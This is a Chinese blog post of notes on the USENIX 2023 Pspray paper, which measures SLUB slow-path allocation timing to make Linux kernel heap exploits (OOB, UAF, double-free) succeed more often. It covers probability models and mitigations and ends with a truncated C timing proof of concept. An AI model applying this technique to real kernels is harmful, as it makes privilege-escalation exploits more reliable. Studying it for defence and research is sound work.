    <title>【PAPER.0x03】论文笔记：Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique </title>
    <link href="https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/"/>
    <id>https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/</id>
    <published>2023-09-15T18:02:37.000Z</published>
    <updated>2023-09-15T18:43:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>🎵THIS IS MY KINGDOM C*M🎵</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>Linux kernel exploitation 方向的论文虽然数量极少，但能上顶会的大部分都还挺有意思的，尤其是发在 USENIX 2023 上的<a href="https://www.usenix.org/conference/usenixsecurity23/presentation/lee-yoochan">这一篇论文</a>笔者觉得是<strong>非常有实战价值</strong>的（笑），因此简单做个小笔记</p><p>因为这一领域的论文读起来比较轻松所以这一篇笔者只会记录其中比较精华的部分，部分地方不一定保留论文原文（而是会选择同义词代换</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>攻击的隐秘性对于攻击者而言是最为至关重要的，因为一旦攻击被发现就寄了，但由于 SLUB 分配器的构造的缘故成功完成漏洞利用的概率都较低</p><p>本文提出 $Pspray$ ：<strong>一项基于时序侧信道的漏洞利用技术</strong>，经测试这项技术可以显著提高漏洞利用的成功率</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲.jpg</del></p></blockquote><p>Linux kernel 有着如 KCFI、KASLR、KDFI 在内的多种保护措施，这使得攻击者难以成功完成利用</p><p>对攻击者而言攻击的隐秘性是最重要的需求之一，若攻击失败则将会被防守方发现，因为这通常会留下痕迹（例如 kernel panic），因此攻击者非常需要提高攻击的成功率</p><p>内核漏洞大都为堆上漏洞（例如由 syzkaller 找到的 1107 个漏洞中有 968 个都是堆相关的），而对攻击者而言要完成利用十分困难，因为这需要攻击者能预测当前的堆分配器状态，而内核堆管理器 SLUB 的结构使其难以被完成</p><blockquote><p>这里原论文还举了个例子，👴就⑧摘抄了，毕竟看这篇论文的前提肯定是默认带🔥都是会点 kernel pwn 的，<del>不会 kernel pwn 你看这篇论文干啥嘛</del></p></blockquote><p>本文提出一种名为 $PSPRAY$ 的新的内核堆利用手法，其可以显著地提升对抗 slab freelist 随机化等保护措施的堆利用的成功率，更具体地说， $PSPRAY$ 的核心是使用时序侧信道来间接获取 slab 的分配状态</p><p>本文工作总结如下：</p><ul><li><strong>分析了堆利用的失败情况</strong></li><li><strong>新的堆利用技术</strong></li><li><strong>新的防御技术</strong></li></ul><h1 id="0x02-Background"><a href="#0x02-Background" class="headerlink" title="0x02. Background"></a>0x02. Background</h1><h2 id="2-1-SLUB-allocator"><a href="#2-1-SLUB-allocator" class="headerlink" title="2.1 SLUB allocator"></a>2.1 SLUB allocator</h2><blockquote><p>建议直接看👴的<a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">这篇博客</a></p></blockquote><h4 id="The-architecture-of-SLUB-allocator"><a href="#The-architecture-of-SLUB-allocator" class="headerlink" title="The architecture of SLUB allocator"></a>The architecture of SLUB allocator</h4><p>SLUB 是 Linux kernel 默认的堆分配器，其基本结构如图 1 所示，其包含了多个不同类型与尺寸的 <code>kmem_cache</code> 内存池，每个 <code>kmem_cache</code> 都有一个 per-CPU 内存池，其中包含独立的 $freelist$ 、$page$ 、$partial$ ，$freelist$ 为一个基于 $page$ 页面上空闲对象所组成的单向链表</p><p>除了 $freelist$  以外，每个 slab 都有自己独立的 $freelist$ ；除了 $CPU\ partial\ page\ freelist$ 以外，每个 node 也有自己独立的 $CPU\ partial\ page\ freelist$ ，在  $CPU\ partial\ page\ freelist$ 用完之后启用</p><p><img src="https://s2.loli.net/2023/09/13/JNkMTZ1s7RQ4DqB.png"></p><h4 id="Allocation-sequence-of-SLUB-allocator"><a href="#Allocation-sequence-of-SLUB-allocator" class="headerlink" title="Allocation sequence of SLUB allocator"></a>Allocation sequence of SLUB allocator</h4><p>图 2 展示了 SLUB 的分配流程：</p><ul><li>首先尝试从 $CPU\ freelist$ 上取</li><li>$CPU-freelist$ 为空，尝试从 $CPU\ page$ 上取 $freelist$，给回  $CPU\ freelist$ （可以理解为 percpu freelist 的初始化）</li><li>$CPU-page$ 也空了，尝试从 $CPU\ partial$ 链表上取</li><li>$CPU\ partial$ 链表也空了，尝试从  $NODE\ partial$ 链表上取</li><li>$NODE\ partial$ 链表也空了，只好转向 $Buddy\ System$ 请求分配新的内存页</li></ul><blockquote><p>buddy system 也空了就该 OOM kill 了（悲</p></blockquote><p><img src="https://s2.loli.net/2023/09/13/zGYbCeZSf41IqdF.png"></p><h2 id="2-2-Slab-Freelist-Random"><a href="#2-2-Slab-Freelist-Random" class="headerlink" title="2.2 Slab Freelist Random"></a>2.2 Slab Freelist Random</h2><p>简单来说就是 <code>CONFIG_SLAB_FREELIST_RANDOM</code> 这个保护的开启会使得 $freelist$ 的初始化更加随机化，空闲对象链表连接不再按常规的地址顺序连接，而是会被打乱</p><p><img src="https://s2.loli.net/2023/09/13/fUMnhteR78rXZOA.png"></p><h1 id="0x03-Exploitation-method-and-failure-cases"><a href="#0x03-Exploitation-method-and-failure-cases" class="headerlink" title="0x03. Exploitation method and failure cases"></a>0x03. Exploitation method and failure cases</h1><p>本节主要讲常规的漏洞利用手法</p><h2 id="3-1-Out-Of-Bounds"><a href="#3-1-Out-Of-Bounds" class="headerlink" title="3.1 Out-Of-Bounds"></a>3.1 Out-Of-Bounds</h2><h4 id="Exploitation-method"><a href="#Exploitation-method" class="headerlink" title="Exploitation method"></a>Exploitation method</h4><p>OOB 就是越界读写，通常来说我们需要在漏洞对象后面放一个被溢出的目标对象，最简单的做法就是直接<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x06-Kernel-Heap-Heap-Spraying">堆喷</a>就完事了</p><p><img src="https://s2.loli.net/2023/09/13/E9hJxTW1ajNmvYe.png"></p><h4 id="Failure-cases"><a href="#Failure-cases" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>但因为地址随机化的存在，我们的被溢出目标对象不一定能恰好落在漏洞对象后面，中间可能隔了几个对象或者直接就错位了：(</p><p><img src="https://s2.loli.net/2023/09/13/ZpbTYHlzVqhLmO5.png"></p><h4 id="Probability-model"><a href="#Probability-model" class="headerlink" title="Probability model"></a>Probability model</h4><p>在开启 freelist 随机化之后的漏洞利用成功率如下，基于 Linux kernel 使用 <code>Fisher-Yates shuffle</code> 算法来进行随机化这个前提计算的，其中 $N$ 为一张 slub 上的总对象数，同时我们假设在同一张 slab 上分配了 1 个漏洞对象与 $k$ 个 victim 对象：</p><p>$$<br>\frac{ _{N-1} C _{k}* _{k} C _{1}}{ _{N} C _{k} * _{N-k} C _{1}} &#x3D; \frac{k}{N}<br>$$</p><p>总体而言，我们从 $N$ 个空闲对象中选择 $k$ 个 victim 对象 与 1 个漏洞对象，在进行利用时 victim 对象与漏洞对象必须相邻，因此我们从 $N-1$ 个对象中取出 $k$ 个对象（剩余一个作为漏洞对象），喷射的 victim 对象数量可以从 0 到 $N-1$ ，因此对于带有 random slab freelist 的 OOB 利用而言的成功率计算如下：</p><p>$$<br>P_{OOB}^{Baseline}&#x3D;\frac{\sum_{k&#x3D;0}^{N-1}\frac{k}{N}}{N}&#x3D;\frac{N-1}{2N}<br>$$</p><h2 id="3-2-Use-After-Free-and-Double-Free"><a href="#3-2-Use-After-Free-and-Double-Free" class="headerlink" title="3.2 Use-After-Free and Double-Free"></a>3.2 Use-After-Free and Double-Free</h2><h4 id="UAF-exploitation-method"><a href="#UAF-exploitation-method" class="headerlink" title="UAF exploitation method"></a>UAF exploitation method</h4><p>UAF 漏洞的利用通常是要将漏洞对象与 victim 对象放在同一内存地址，图 6 展示了对 CVE-2019-2215 的利用过程，首先用 <code>epoll_ctl()</code> 分配漏洞对象，接下来用 <code>ioctl()</code> 释放漏洞对象，随后用 <code>msgsnd()</code> 取回刚刚释放的对象，最后再用 <code>close()</code> 将该对象释放</p><p><img src="https://s2.loli.net/2023/09/15/mP3yD9Yq2lKIgWQ.png"></p><h4 id="DF-exploitation-method"><a href="#DF-exploitation-method" class="headerlink" title="DF exploitation method"></a>DF exploitation method</h4><blockquote><p>在笔者看来 DF 和 UAF 本质上是一样的</p></blockquote><p>Double Free 漏洞则是将一个已经被释放的对象再次释放，从而通过留下的垂悬指针完成利用（笔者注：其实就是 UAF 嘛），图 7 展示了对 CVE-2017-6074 的利用过程，首先通过 <code>connect()</code> 分配漏洞对象与三个额外的对象冰释放掉漏洞对象，随后通过 <code>msgsnd()</code> 分配 victim 对象，接下来通过 <code>shutdown()</code> 完成 DF 将 victim 对象释放掉，最后分配目标对象，当我们访问 victim 对象时目标对象便会被破坏</p><p><img src="https://s2.loli.net/2023/09/15/mZLUcSAIPhW7TOJ.png"></p><h4 id="Failure-cases-1"><a href="#Failure-cases-1" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>由于 SLUB 的特性，对 UAF 与 DF 漏洞的利用是有可能失败的，图 8 显示了利用 UAF&#x2F;DF 漏洞失败的一种可能性，即额外的“噪声”分配导致了 perCPU page 发生了改变</p><blockquote><p>笔者注：比如说 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">key_ctl</a> 这样的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/revXByanRGVKmS1.png"></p><h4 id="Probability-model-1"><a href="#Probability-model-1" class="headerlink" title="Probability model"></a>Probability model</h4><p>UAF 与 DF 漏洞利用的成功率如下，$N$ 为每张 slab 上的对象数量， $A$ 为系统调用所分配的对象数量（即分配的漏洞对象数量与额外结构体的数量之和）：</p><p><img src="https://s2.loli.net/2023/09/16/so5iPEvlCcuBtjN.png"></p><blockquote><p>这里用 Latex 打不出来只能上图了，因为笔者博客的 latex 支持非常残疾（悲</p></blockquote><p>有两种情况：当 <code>A &lt; N</code> 时，成功率决定于漏洞对象与额外对象是否在同一张 slab 上；当 <code>A &gt;= N</code> 时，当分配漏洞对象的系统调用所分配的最后一个对象完全填充 CPU page 时利用将会成功，若一张 slab 被耗尽，对应的 slab 会被移动到 full 链表上，CPU page 便变为空，此时若对象被释放，则包含该对象的 slab 将重新变为 CPU page</p><h1 id="0x04-Our-Approach-PSPRAY"><a href="#0x04-Our-Approach-PSPRAY" class="headerlink" title="0x04. Our Approach : PSPRAY"></a>0x04. Our Approach : PSPRAY</h1><p>漏洞利用失败的主要原因是对 slab 信息的缺失，本文找到了一种能够获取 slab 的部分分配信息的时序侧信道方法，从而提高利用成功概率</p><h2 id="4-1-Timing-Side-Channel-on-SLUB-allocator"><a href="#4-1-Timing-Side-Channel-on-SLUB-allocator" class="headerlink" title="4.1 Timing Side-Channel on SLUB allocator"></a>4.1 Timing Side-Channel on SLUB allocator</h2><p>如图 2.1 所示，SLUB 有五条不同深度的分配路径以优化性能表现，为了弄清不同路径的表现，作者通过 <code>msgsnd()</code> 系统调用（如图 4.3 所示其仅分配一个对象）测试了从 <code>kmalloc()</code> 的核心函数 <code>slab_alloc_node()</code> 的开始到结尾的性能，经过多轮测试发现 <code>slow-path</code> 与其他路径相比存在明显的表现差距，因此攻击者可以通过测量分配时间得知内存分配所经历的路径</p><h2 id="4-2-Inferring-Allocation-Status"><a href="#4-2-Inferring-Allocation-Status" class="headerlink" title="4.2 Inferring Allocation Status"></a>4.2 Inferring Allocation Status</h2><p> <code>slow-path</code> 以外的分配路径的分配状态都是难以确定的，但 <code>slow-path</code> 的行为与其他路径不同，此时内核会从 buddy system 分配一张新 slab，由此我们可以知道当前的 slab 刚被分配且仅分配了一个对象</p><h2 id="4-3-Proof-Of-Concept"><a href="#4-3-Proof-Of-Concept" class="headerlink" title="4.3 Proof-Of-Concept"></a>4.3 Proof-Of-Concept</h2><h4 id="Finding-an-adequate-system-call"><a href="#Finding-an-adequate-system-call" class="headerlink" title="Finding an adequate system call"></a>Finding an adequate system call</h4><p>为了使用时序侧信道，我们需要找到满足以下三个条件的系统调用：</p><ul><li>普通用户权限可用</li><li>仅分配一个对象</li><li>除了对象分配以外的性能开销要小</li></ul><p>作者修改了 kernel 以在系统调用仅分配一个 <code>kmalloc-xx</code> 中的对象时 panic，并使用 Syzkaller 进行测试，找到了如表 A.1 所示的 23 个满足该条件的系统调用，这些从用户空间拷贝数据的系统调用涵盖了 <code>kmalloc-32</code> 到 <code>kmalloc-8192</code>，同时其内存分配以外的代码不会过于影响内存</p><p><img src="https://s2.loli.net/2023/09/15/5EYjRperomGIhwB.png"></p><h4 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h4><p>简单来说就是用 <code>msgsnd()</code> 做了堆喷 1000 次的测试并测量其表现</p><h4 id="Experiment-Results"><a href="#Experiment-Results" class="headerlink" title="Experiment Results"></a>Experiment Results</h4><p>图 9 为使用 <code>msgsnd()</code> 进行测试的结果，可知 <code>fast-path</code> 与 <code>medium-path</code> 间难以做出区分（都要消耗 10000 左右的 CPU 周期），但 <code>slow-path</code> 可以被区分（要消耗 35000 左右的 CPU 周期）</p><p><img src="https://s2.loli.net/2023/09/15/DhbYf6i1sMHFeLR.png"></p><h1 id="0x05-Application-of-PSPRAY"><a href="#0x05-Application-of-PSPRAY" class="headerlink" title="0x05. Application of PSPRAY"></a>0x05. Application of PSPRAY</h1><h2 id="5-1-OOB-Exploitation"><a href="#5-1-OOB-Exploitation" class="headerlink" title="5.1 OOB Exploitation"></a>5.1 OOB Exploitation</h2><p>图 10 展示了在开启 free list randomization 的情况下对 OOB 漏洞应用 PSPRAY 的过程：</p><ul><li>使用 PSPRAY 确定 <code>slow-path</code> 是否被执行，此时 slab <code>B</code> 被创建且已分配了一个结构体</li><li>接下来我们堆喷 <code>N-1</code> 个对象将其完全分配（假设一张 slab 上有 <code>N</code> 个对象）</li><li>我们接下来的分配又会分配一张新的 slab <code>C</code> ，分配 <code>N - 1</code> 个 victim 对象</li><li>分配漏洞对象，此时若漏洞对象不为 slab 上地址最高处对象，则 OOB 将成功</li></ul><p><img src="https://s2.loli.net/2023/09/15/pBelmXzb6I1fuPH.png"></p><p>利用成功率为：<br>$$<br>P_{OOB}^{PSPRAY}&#x3D;\frac{N-1}{N}<br>$$</p><h2 id="5-2-UAF-and-DF-Exploitation"><a href="#5-2-UAF-and-DF-Exploitation" class="headerlink" title="5.2 UAF and DF Exploitation"></a>5.2 UAF and DF Exploitation</h2><p>图 11 展示了如何在 UAF 与 DF 漏洞上利用 PSPRAY：</p><ul><li>首先用 PSPRAY 找到新 slab 被分配的时间点，此时我们便知道一张已分配一个对象的 slab 被创建了</li><li>然后正常利用 UAF&#x2F;DF</li></ul><blockquote><p>👴寻思好像没啥可讲的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/wLO8TNY4Q1e7zn5.png"></p><p>利用成功率为：</p><p><img src="https://s2.loli.net/2023/09/16/V6jo4yT2OSLMBAk.png"></p><h1 id="0x06-Attack-Evaluation"><a href="#0x06-Attack-Evaluation" class="headerlink" title="0x06. Attack Evaluation"></a>0x06. Attack Evaluation</h1><p>论文里这一节主要是做测试</p><h2 id="6-1-Synthetic-Vulnerability"><a href="#6-1-Synthetic-Vulnerability" class="headerlink" title="6.1 Synthetic Vulnerability"></a>6.1 Synthetic Vulnerability</h2><p>主要是作者自己开发漏洞自己打，测试用的 OOB 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/CAsp71oLIZPBykf.png"></p><p>UAF 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/kW8aPNTIxOEsBnr.png"></p><p>结果如表 1 所示：</p><p><img src="https://s2.loli.net/2023/09/15/DpNMjv3GAdstokR.png"></p><h2 id="6-2-Real-World-Vulnerability"><a href="#6-2-Real-World-Vulnerability" class="headerlink" title="6.2 Real-World Vulnerability"></a>6.2 Real-World Vulnerability</h2><p>打了一些真实的洞，结果如表 2 所示，和公开的 exp 相比利用成功率提升明显：</p><p><img src="https://s2.loli.net/2023/09/15/rGhvEOywRWi6S1B.png"></p><h1 id="0x07-Mitigation"><a href="#0x07-Mitigation" class="headerlink" title="0x07. Mitigation"></a>0x07. Mitigation</h1><p>PSPRAY 主要有两个点：</p><ul><li><code>slow-path</code> 的分配速度差异明显</li><li><code>slow-path</code> 的出现意味着此时的 freelist 为空</li></ul><p>作者认为针对 PSPRAY 的防御手段主要有以下两个：</p><ul><li>让所有的分配路径都有着相似的性能表现（针对第一个点）</li><li>随机化 <code>slow-path</code> 分配上下文（针对第二个点）</li></ul><h3 id="Mitigation-1-Uniform-Allocation-Performance"><a href="#Mitigation-1-Uniform-Allocation-Performance" class="headerlink" title="Mitigation #1. Uniform Allocation Performance."></a>Mitigation #1. Uniform Allocation Performance.</h3><p>基本没啥活可以整</p><h3 id="Mitigation-2-Randomized-Slow-path-Allocation-Context"><a href="#Mitigation-2-Randomized-Slow-path-Allocation-Context" class="headerlink" title="Mitigation #2. Randomized Slow-path Allocation Context."></a>Mitigation #2. Randomized Slow-path Allocation Context.</h3><p>主要是让分配并不是在 freelist 为空时才进入到 <code>slow-path</code> ，这里设计了一个简易的算法就是让 slab 上对象的 idx 与一个常量相等且 CPU partial 为空时进到一个新的 slow path，从而使得这两个 slow path 无法被区分</p><p><img src="https://s2.loli.net/2023/09/15/EnYdvIbhfp4FkUS.png"></p><p>图 12 显示了这种方法的基本原理：</p><p><img src="https://s2.loli.net/2023/09/15/yNGZAbSz7qaJfrs.png"></p><h1 id="0x08-Discussion"><a href="#0x08-Discussion" class="headerlink" title="0x08. Discussion"></a>0x08. Discussion</h1><h2 id="8-1-The-Noise"><a href="#8-1-The-Noise" class="headerlink" title="8.1 The Noise"></a>8.1 The Noise</h2><p>由调度器带来的噪音仍可以阻碍利用，主要来自两种机制：CPU 迁移与上下文切换；这样的噪声可以在分配&#x2F;释放一个目标对象或漏洞对象时出现</p><blockquote><p>👴感觉用 <code>sched_setaffinity()</code> 绑核可以完美解决这个问题</p></blockquote><h2 id="8-2-The-Other-OSes"><a href="#8-2-The-Other-OSes" class="headerlink" title="8.2 The Other OSes"></a>8.2 The Other OSes</h2><p>其他的 OSes 也可以采用 PSPRAY 方法进行利用，因为其采用与 Linux 相类似的堆分配器，作者这里测了 FreeBSD 和 XNU，具体的笔者就不贴了：）</p><h1 id="0x09-Related-work"><a href="#0x09-Related-work" class="headerlink" title="0x09. Related work"></a>0x09. Related work</h1><h3 id="Kernel-Automated-Exploit-Generation"><a href="#Kernel-Automated-Exploit-Generation" class="headerlink" title="Kernel Automated Exploit Generation"></a>Kernel Automated Exploit Generation</h3><p>自动化利用，如 <a href="https://www.usenix.org/conference/usenixsecurity18/presentation/wu-wei">FUZE</a> 用 fuzz 和符号执行来构造利用，<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng">KOOBE</a> 则针对 OOB 类漏洞进行自动化利用生成</p><blockquote><p>AEG 说实话还是挺有意思的，可惜笔者之前确实没咋关注过：）</p></blockquote><h3 id="Kernel-Exploit-Techniques"><a href="#Kernel-Exploit-Techniques" class="headerlink" title="Kernel Exploit Techniques"></a>Kernel Exploit Techniques</h3><p>类似的利用技术相关的研究有 ret2usr、<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">ret2dir</a>、<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/lee-yoochan">ExpRace</a>、<a href="https://dl.acm.org/doi/10.1145/3372297.3423353">Eloise</a> 等</p><h3 id="Timing-Side-Channel-Attack-against-Kernel"><a href="#Timing-Side-Channel-Attack-against-Kernel" class="headerlink" title="Timing Side-Channel Attack against Kernel"></a>Timing Side-Channel Attack against Kernel</h3><p>对时序侧信道技术的研究也很多，比如说 <a href="https://ieeexplore.ieee.org/document/6547110">https://ieeexplore.ieee.org/document/6547110</a>、<a href="https://dl.acm.org/doi/10.1145/2976749.2978321">DRK</a>、<a href="https://www.usenix.org/conference/usenixsecurity18/presentation/lipp">Meltdown</a> 等</p><h1 id="0x0A-Conclusion"><a href="#0x0A-Conclusion" class="headerlink" title="0x0A. Conclusion"></a>0x0A. Conclusion</h1><p>这篇论文基于 SLUB 分配器的构造提出了名为 $PSPRAY$ 的时序侧信道利用手法，经测试能够有效提升 OOB 与 UAF&#x2F;DF 漏洞的利用成功率</p><blockquote><p>👴寻思好像也没啥好讲的</p></blockquote><h1 id="0xFF-What’s-more"><a href="#0xFF-What’s-more" class="headerlink" title="0xFF. What’s more?"></a>0xFF. What’s more?</h1><p>笔者自己也试了一下这个方法，发现<strong>slow-path 的执行时间确实可以与其他路径进行区分</strong>（只需要用一些统计学手段就好），下面是笔者自己测试用的代码，<strong>在真机测试与 QEMU 虚拟机测试中 slow-path 都表现出了显著的性能开销，这意味着这种方法确乎可以被应用于 CTF 与实战当中</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">del_msg_queue</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msqid_ds</span> <span class="hljs-title">ds_buf</span>;</span><br>    <span class="hljs-keyword">return</span> msgctl(msqid, IPC_RMID, &amp;ds_buf);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">rdtsc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> lo, hi;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;rdtsc&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (lo), <span class="hljs-string">&quot;=d&quot;</span> (hi)</span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> (((<span class="hljs-type">uint64_t</span>) hi) &lt;&lt; <span class="hljs-number">32</span>) | lo;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">uint64_t</span> exec_time[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span 